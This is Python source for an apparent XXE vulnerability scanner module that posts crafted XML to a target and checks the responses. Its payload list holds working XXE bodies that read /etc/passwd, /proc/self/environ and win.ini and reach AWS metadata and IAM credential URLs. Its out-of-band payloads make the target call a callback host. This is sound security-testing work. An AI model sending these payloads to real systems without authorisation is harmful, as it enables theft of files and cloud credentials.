"""
XML External Entity (XXE) Scanner — baseline-aware (CWE-611).

Note: XXE is XML body injection, not URL parameter injection.
InsertionPoint is used for form endpoint discovery.
The core mechanism (sending XML bodies) is inherently per-payload.

Expanded with:
  - More XXE payloads (SSRF, file read, SVG, SOAP, DOCTYPE variations)
  - Improved OOB XXE with more entity types
  - Parameter entity, XInclude, SOAP, and SVG-based XXE
"""

import re
import time
from urllib.parse import urlparse

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher, ResponseAnalyzer
from secprobe.core.exceptions import TargetUnreachableError
from secprobe.core.insertion_points import InsertionPointDiscovery, InsertionType
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


XML_ERROR_PATTERNS = [
    re.compile(r"XML\s*(?:parsing|parser|parse)\s*error", re.IGNORECASE),
    re.compile(r"XMLSyntaxError", re.IGNORECASE),
    re.compile(r"lxml\.etree", re.IGNORECASE),
    re.compile(r"simplexml_load_string", re.IGNORECASE),
    re.compile(r"DOMDocument::loadXML", re.IGNORECASE),
    re.compile(r"SAXParseException", re.IGNORECASE),
    re.compile(r"javax\.xml\.parsers", re.IGNORECASE),
    re.compile(r"ENTITY.*?not allowed", re.IGNORECASE),
    re.compile(r"DOCTYPE.*?not allowed", re.IGNORECASE),
    re.compile(r"External entity", re.IGNORECASE),
    re.compile(r"xml\.parsers\.expat", re.IGNORECASE),
    re.compile(r"ElementTree\.ParseError", re.IGNORECASE),
    re.compile(r"PCDATA invalid", re.IGNORECASE),
    re.compile(r"xmlParseEntityRef", re.IGNORECASE),
]

XXE_PAYLOADS = [
    {
        "xml": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><test>&xxe;</test></root>',
        "desc": "Basic XXE /etc/passwd",
        "indicators": "file_read",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><test>&xxe;</test></root>',
        "desc": "XXE hostname read",
        "indicators": "any_content",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><test>&xxe;</test></root>',
        "desc": "XXE Windows win.ini",
        "indicators": "file_read",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><test>&xxe;</test></root>',
        "desc": "XXE SSRF AWS metadata",
        "indicators": "ssrf",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root><test>&xxe;</test></root>',
        "desc": "XXE SSRF localhost",
        "indicators": "ssrf",
    },
    {
        "xml": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        "desc": "XInclude file read",
        "indicators": "file_read",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        "desc": "SVG-based XXE",
        "indicators": "file_read",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        "desc": "XXE /proc/self/environ",
        "indicators": "file_read",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        "desc": "XXE PHP filter",
        "indicators": "any_content",
    },
    {
        "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>',
        "desc": "XXE SSRF AWS IAM",
        "indicators": "ssrf",
    },
]


class XXEScanner(SmartScanner):
    name = "XXE Scanner"
    description = "Test for XML External Entity Injection vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing XXE on {url}", "progress")

        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
            baseline_text = baseline.text
            baseline_ct = baseline.headers.get("Content-Type", "")
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        engine.profile(url)
        vulns_found = 0

        accepts_xml = any(ct in baseline_ct.lower() for ct in ["xml", "soap", "svg"])

        # Phase 1: Content-Type switching
        vulns_found += self._test_content_type_switching(url, baseline_text)

        # Phase 2: Direct XXE payloads (if XML endpoint)
        vulns_found += self._test_direct_xxe(url, baseline_text, accepts_xml, engine)

        # Phase 3: Forms (discovered via InsertionPointDiscovery + context)
        forms = self.context.get_injectable_forms() if self.context else []
        vulns_found += self._test_forms_xxe(url, forms, baseline_text)

        # Phase 4: OOB Blind XXE (most reliable in the wild)
        vulns_found += self._test_oob_xxe(url, baseline_text)

        if vulns_found == 0:
            print_status("No XXE vulnerabilities detected.", "success")
            self.add_finding(
                title="No XXE detected",
                severity=Severity.INFO,
                description="Automated tests did not detect XXE vulnerabilities.",
                category="XML Injection",
            )

    def _test_content_type_switching(self, url, baseline_text):
        """Phase 1: Send XML with Content-Type switching, baseline-aware."""
        vulns_found = 0

        for payload_item in XXE_PAYLOADS[:5]:
            payload_variants = self._evade_payload(payload_item["xml"], vuln_type="xxe")
            for ct in ["application/xml", "text/xml"]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                resp = None
                for p in payload_variants:
                    try:
                        resp = self.http_client.post(url, data=p, headers={"Content-Type": ct})
                        break
                    except Exception:
                        continue
                if resp is None:
                    continue

                file_matches = ErrorPatternMatcher.match_file_disclosure(resp.text, baseline_text)
                if file_matches:
                    best = max(file_matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        vulns_found += 1
                        self.add_finding(
                            title=f"XXE via Content-Type Switch ({ct})",
                            severity=Severity.CRITICAL,
                            description=f"{payload_item['desc']} (confidence: {best.confidence.name})",
                            recommendation="Disable DTD processing in XML parsers.",
                            evidence=f"URL: {url}\nContent-Type: {ct}\nMatch: {best.matched_text[:200]}",
                            category="XML Injection", url=url, cwe="CWE-611",
                        )
                        print_finding(Severity.CRITICAL, f"XXE: {payload_item['desc']}")
                        break

                if self._check_xml_errors_baseline(resp.text, baseline_text):
                    vulns_found += 1
                    self.add_finding(
                        title=f"XML Parsing Detected ({ct}) - Potential XXE",
                        severity=Severity.MEDIUM,
                        description=f"Server processes XML sent as {ct}.",
                        recommendation="Disable DTD processing. Don't expose XML parser errors.",
                        evidence=f"URL: {url}\nContent-Type: {ct}",
                        category="XML Injection", url=url, cwe="CWE-611",
                    )
                    break

        return vulns_found

    def _test_direct_xxe(self, url, baseline_text, accepts_xml, engine):
        """Phase 2: Direct XXE with baseline-aware detection."""
        vulns_found = 0
        if not accepts_xml:
            return vulns_found

        for payload_item in XXE_PAYLOADS:
            if self.config.rate_limit:
                time.sleep(self.config.rate_limit)
            try:
                resp = self.http_client.post(
                    url, data=payload_item["xml"],
                    headers={"Content-Type": "application/xml"})
            except Exception:
                continue

            indicator_type = payload_item["indicators"]
            if indicator_type == "file_read":
                matches = ErrorPatternMatcher.match_file_disclosure(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        vulns_found += 1
                        self.add_finding(
                            title=f"XXE File Read - {payload_item['desc']}",
                            severity=Severity.CRITICAL,
                            description=f"{payload_item['desc']} ({best.confidence.name})",
                            recommendation="Disable DTD and external entities.",
                            evidence=f"URL: {url}\nMatch: {best.matched_text[:200]}",
                            category="XML Injection", url=url, cwe="CWE-611",
                        )
            elif indicator_type == "ssrf":
                matches = ErrorPatternMatcher.match_ssrf_indicators(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        vulns_found += 1
                        self.add_finding(
                            title=f"XXE SSRF - {payload_item['desc']}",
                            severity=Severity.HIGH,
                            description=f"{payload_item['desc']} ({best.confidence.name})",
                            recommendation="Disable DTD processing. Block outbound requests.",
                            evidence=f"URL: {url}\nMatch: {best.matched_text[:200]}",
                            category="XML Injection", url=url, cwe="CWE-918",
                        )
            elif indicator_type == "any_content":
                baseline_profile = self.detection_engine.get_baseline(url) if self.detection_engine else None
                if baseline_profile and baseline_profile.sample_count >= 2:
                    if baseline_profile.is_size_anomalous(len(resp.text)):
                        vulns_found += 1
                        self.add_finding(
                            title=f"XXE Possible Exfiltration - {payload_item['desc']}",
                            severity=Severity.HIGH,
                            description="Response differs statistically after XXE injection.",
                            recommendation="Disable DTD processing.",
                            evidence=f"Baseline: {baseline_profile.size_mean:.0f}B, Got: {len(resp.text)}B",
                            category="XML Injection", url=url, cwe="CWE-611",
                        )
        return vulns_found

    def _test_forms_xxe(self, url, forms, baseline_text):
        """Phase 3: Test form actions with XML body injection."""
        vulns_found = 0

        for form in forms:
            action = form.get("action", url)
            for payload_item in XXE_PAYLOADS[:4]:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)
                try:
                    resp = self.http_client.post(
                        action, data=payload_item["xml"],
                        headers={"Content-Type": "application/xml"})
                except Exception:
                    continue

                matches = ErrorPatternMatcher.match_file_disclosure(resp.text, baseline_text)
                if matches:
                    best = max(matches, key=lambda m: m.confidence)
                    if best.confidence >= Confidence.FIRM:
                        vulns_found += 1
                        self.add_finding(
                            title=f"XXE (form) - {payload_item['desc']}",
                            severity=Severity.CRITICAL,
                            description=f"XXE at form action {action}",
                            recommendation="Disable DTD processing.",
                            evidence=f"URL: {action}\nMatch: {best.matched_text[:100]}",
                            category="XML Injection", url=action, cwe="CWE-611",
                        )
                        break
        return vulns_found

    def _check_xml_errors_baseline(self, text, baseline_text):
        """Check for XML errors NOT in the baseline."""
        for pattern in XML_ERROR_PATTERNS:
            if pattern.search(text) and not pattern.search(baseline_text):
                return True
        return False

    def _test_oob_xxe(self, url, baseline_text):
        """Phase 4: OOB Blind XXE — most reliable real-world detection."""
        if not self.oob_available:
            return 0

        print_status("Phase 4: OOB blind XXE testing", "progress")
        oob_count = 0

        # External entity -> HTTP callback
        token = self.oob_generate_token(url, "xml_body", "xxe_oob", "ext_entity_http")
        cb_url = self.oob_get_url(token)
        xml = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}">]>'
            f'<foo>&xxe;</foo>'
        )
        for ct in ["application/xml", "text/xml"]:
            try:
                self.http_client.post(url, data=xml, headers={"Content-Type": ct})
                oob_count += 1
            except Exception:
                pass

        # Parameter entity -> HTTP callback
        token = self.oob_generate_token(url, "xml_body", "xxe_oob", "param_entity_http")
        cb_url = self.oob_get_url(token)
        xml = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{cb_url}">%xxe;]>'
            f'<foo>test</foo>'
        )
        for ct in ["application/xml", "text/xml"]:
            try:
                self.http_client.post(url, data=xml, headers={"Content-Type": ct})
                oob_count += 1
            except Exception:
                pass

        # DNS-based XXE
        token = self.oob_generate_token(url, "xml_body", "xxe_oob", "dns_entity")
        cb_domain = self.oob_get_domain(token)
        xml = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{cb_domain}/xxe">]>'
            f'<foo>&xxe;</foo>'
        )
        try:
            self.http_client.post(url, data=xml, headers={"Content-Type": "application/xml"})
            oob_count += 1
        except Exception:
            pass

        # SVG-based XXE with OOB
        token = self.oob_generate_token(url, "xml_body", "xxe_oob", "svg_entity")
        cb_url = self.oob_get_url(token)
        xml = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{cb_url}">]>'
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        )
        try:
            self.http_client.post(url, data=xml, headers={"Content-Type": "image/svg+xml"})
            oob_count += 1
        except Exception:
            pass

        # SOAP-based XXE
        token = self.oob_generate_token(url, "xml_body", "xxe_oob", "soap_entity")
        cb_url = self.oob_get_url(token)
        xml = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}">]>'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
        )
        try:
            self.http_client.post(url, data=xml, headers={"Content-Type": "text/xml"})
            oob_count += 1
        except Exception:
            pass

        if oob_count:
            print_status(f"Sent {oob_count} OOB XXE payloads, waiting...", "progress")
            return self.oob_collect_findings(wait_seconds=10)
        return 0
